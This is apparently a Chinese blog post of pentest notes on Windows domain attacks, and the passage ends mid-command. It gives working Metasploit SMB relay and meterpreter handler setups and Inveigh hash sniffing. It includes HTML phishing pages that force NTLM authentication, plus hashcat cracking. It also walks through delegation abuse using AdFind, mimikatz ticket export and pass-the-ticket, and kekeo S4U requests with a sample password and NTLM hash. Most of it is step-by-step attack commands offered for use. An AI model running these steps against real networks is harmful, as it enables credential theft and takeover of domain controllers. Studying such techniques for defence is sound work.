&lt;p&gt;与 NLTM 认证相关的安全问题主要有 Pass The Hash、利用 NTLM 进行信息收集、Net-NTLM Hash 破解、NTLM Relay 几种。PTH 前期已经了，运用 m imikatz、impacket 工具包的一些脚本、CS 等等都可以利用，NTLM Relay 又包括 (relay to smb,ldap,ews)&lt;/p&gt;
&lt;p&gt;可以应用在获取不到明文或 HASH 时采用的手法，但也要注意手法的必备条件。&lt;/p&gt;
&lt;p&gt;域内用户主机的非域用户角色即 administartor 登录 = 时，如果采用 dir \192.168.x.x\c$ 的方式去访问其他主机的文件，会将当前主机的用户名和密码进行 碰撞，如果对方主机恰好采用了相同的登录名和密码，则碰撞成功，取得访问权限成功。&lt;/p&gt;
&lt;p&gt;条件：需要一台域内主机管理员权限，通讯双方当前用户密码一致&lt;/p&gt;
&lt;p&gt;以下命令主要是用 msf 做了中继，现将 cs 中的主机联动到 msf，在 msf 中添加路由，选择 smb 重发模块，通过主动连接的方式使肉鸡可以连接到 msf。 当跳板机使用自己的用户名和密码去碰撞 kali 用户名密码时，msf 监听到此碰到并转发给肉机进行碰撞尝试。一旦碰撞成功，就会得到肉机的权限。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置木马&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CS创建外联监听器，选择外围http的方式，并命名为msf，输入命令spawn msf，将当前主机的权限移交给msf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;MSF: 监听上线：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/multi/handler&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/reverse_http&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lhost 0.0.0.0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set lport 8888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加路由：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run autoroute -p # 查看当前路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run post/multi/manage/autoroute # 添加当前路由表&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;backgroup # 返回&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重发模块：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;use exploit/windows/smb/smb_relay&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set smbhost 192.168. 3. 32 //攻击目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhost 192.168.3. 32 //设置连接目标&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set autorunscript post/windows/manage/migrate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;主动连接：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set payload windows/meterpreter/bind_tcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\192.168.46.166\c$ //设置本地IP&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jobs 查看当前任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jobs - K 删除当前任务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;system-&amp;gt;administrator&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;cs: ps 看哪个进程启用的是 administrator 权限，利用 steal_token pid 来窃取权限，getuid 检验，检验得到是 administrator 的情况时，使用 shell dir \192.168.46.166\c$ 进行碰撞。此后将会在 msf 中上线肉机。&lt;/p&gt;
&lt;p&gt;msf: 监听 smb 重发模块之后，返回跳板机 meterpreter 会话，选择 ps，查看拥有 administrator 权限的主机，输入 migrate pid 进行权限修改，getuid 检验权限，输入 shell 执行 dir \192.168.46.166\c$ 会上线肉机，通过 sessions 查看当前是否存在了新的肉机。&lt;/p&gt;
&lt;h4 id=&#34;ntlm-inveigh-嗅探&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ntlm-inveigh-嗅探&#34;&gt;#&lt;/a&gt; NTLM Inveigh 嗅探&lt;/h4&gt;
&lt;p&gt;条件：被控主机当前管理员权限&lt;/p&gt;
&lt;p&gt;（ 1 ）监听拦截 Inveigh.exe&lt;br&gt;
 项目地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0tldmluLVJvYmVydHNvbi9JbnZlaWdo&#34;&gt;https://github.com/Kevin-Robertson/Inveigh&lt;/span&gt;&lt;br&gt;
 可以上传到肉机上，或者 socket 代理出来，执行之后配合钓鱼获取其他主机的 hash，获取到的是 NET NTLM HASH V1 或 V2。&lt;/p&gt;
&lt;p&gt;（ 2 ）触发拦截&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当肉机执行如下命令时会被拦截&lt;span class=&#34;built_in&#34;&gt;hash&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\192.168.3.x\c$&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可以构造内网web进行钓鱼触发http://192.168.3.31/1.html&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;img src=&amp;quot;file:///\\192.168.3.32\2&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;破解密文 https://github.com/hashcat/hashcat/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hashcat -m 5600 hash pass.txt --show&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;委派攻击分类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#委派攻击分类&#34;&gt;#&lt;/a&gt; 委派攻击分类&lt;/h4&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTE1NTU=&#34;&gt;https://xz.aliyun.com/t/11555&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;（ 1 ）非约束性委派 - 没有限制&lt;/p&gt;
&lt;p&gt;a. 非约束委派原理：&lt;br&gt;
机器 A (域控) 访问具有非约束委派权限的机器 B 的服务，会把当前认证用户 (域管用户) 的的 TGT 放在 ST 票据中，一起发送给机器 B，机器 B 会把 TGT 存储在 lsass 进程中以备下次重用。从而机器 B 就能使用这个 TGT 模拟认 证用户 (域管用户) 访问服务。&lt;/p&gt;
&lt;p&gt;b. 利用场景：&lt;br&gt;
攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的 TGT，从而模拟域管用户。&lt;/p&gt;
&lt;p&gt;c. 总结&lt;br&gt;
首先判断委派的第三个设置，然后看针对用户，主动攻击。&lt;/p&gt;
&lt;p&gt;（ 2 ）约束性委派 - 有限制&lt;/p&gt;
&lt;p&gt;a. 约束委派原理：&lt;br&gt;
由于非约束委派的不安全性，微软在 windows server 2003 中引入了约束委&lt;br&gt;
派，对 Kerberos 协议进行了拓展，引入了 SService for User to Self (S4U2Self) 和 Service for User to Proxy (S4U2proxy)。&lt;/p&gt;
&lt;p&gt;b. 利用场景：&lt;br&gt;
如果攻击者控制了服务 A 的账号，并且服务 A 配置了到域控的 CIFS 服务的约束性委派。则攻击者可以先使用 S4u2seflt 申请域管用户（administrator）访问 A 服务的 ST1，然后使用 S4u2Proxy 以 administrator 身份访问域控的 CIFS 服务，即相当于控制了域控。&lt;/p&gt;
&lt;p&gt;c. 总结&lt;br&gt;
首先判断委派的第二个设置，然后看针对用户，后续钓鱼配合&lt;/p&gt;
&lt;p&gt;（ 3 ）基于资源的约束性委派 - 资源方面的限制&lt;/p&gt;
&lt;p&gt;a. 资源约束委派原理（不需要委派的任何设置！）：&lt;br&gt;
基于资源的约束委派 (RBCD) 是在 Windows Server 2012 中新加入的功能，&lt;br&gt;
与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD 把 设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。 也就是说机器自身可以直接在自己账户上配置 msDS-AllowedToActOnBehalfOfO therIdentity 属性来设置 RBCD。&lt;/p&gt;
&lt;p&gt;b. 利用条件：&lt;br&gt;
域控 Windows2012 及以上、存在域内成员用户加入域操作&lt;/p&gt;
&lt;p&gt;c. 总结&lt;br&gt;
只看 DC 是不是 2012 及以上帮版本，然后看针对用户，主动攻击。计算机加入域时，加入域的域用户被控后也将导致使用当前域用户加入的计算机受控。&lt;/p&gt;
&lt;h4 id=&#34;非约束委派&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#非约束委派&#34;&gt;#&lt;/a&gt; 非约束委派&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;复现配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;域控配置机器的委派属性，信任此计算机来委派任何服务，并且在域控上执行 &lt;code&gt;setspn -U -A priv/test webadmin&lt;/code&gt; ，于是 webadmin 有了委派权限。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断委派权限的服务账户和机器账户：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 查询域内设置了非约束委派的服务账户：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind -b &amp;quot;DC=god,DC=org&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;quot; dn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 查询域内设置了非约束委派的机器账户:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind -b &amp;quot;DC=god,DC=org&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&amp;quot; dn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;利用步骤：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 域控与委派机器通讯&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;域控主动执行：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;net use \\webserver&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;钓鱼诱使域管访问：http://192.168.3.31/31.html&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;title&amp;gt;&amp;lt;/title&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/head&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;img src=&amp;quot;file:///\\192.168.3.31\2&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/body&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 导出票据到本地&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz sekurlsa::tickets /export&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;c. 导入票据到内存&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mimikatz kerberos::ptt [0;fece8]- 2 - 0 - 60a00000-Administrator@krbtgt-GOD.ORG.kirbi&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;d. 连接通讯域控&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dir \\owa2010cn-god\c$&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;约束委派&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#约束委派&#34;&gt;#&lt;/a&gt; 约束委派&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;复现配置&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;机器设置仅信任此计算机指定服务 - cifs、用户设置仅信任此计算机指定服务 - cifs&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断查询&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 查询机器用户配置约束委派&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind -b &amp;quot;DC=god,DC=org&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&amp;quot; msds-allowedtodelegateto&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 查询服务账户配置约束委派&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AdFind -b &amp;quot;DC=god,DC=org&amp;quot; -f &amp;quot;(&amp;amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&amp;quot; msds-allowedtodelegateto&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;利用步骤：&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;a. 获取用户的票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kekeo &amp;quot;tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kekeo &amp;quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&amp;quot; &amp;quot;exit&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;b. 利用用户票据获取域控票据&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kekeo &amp;quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god&amp;quot; 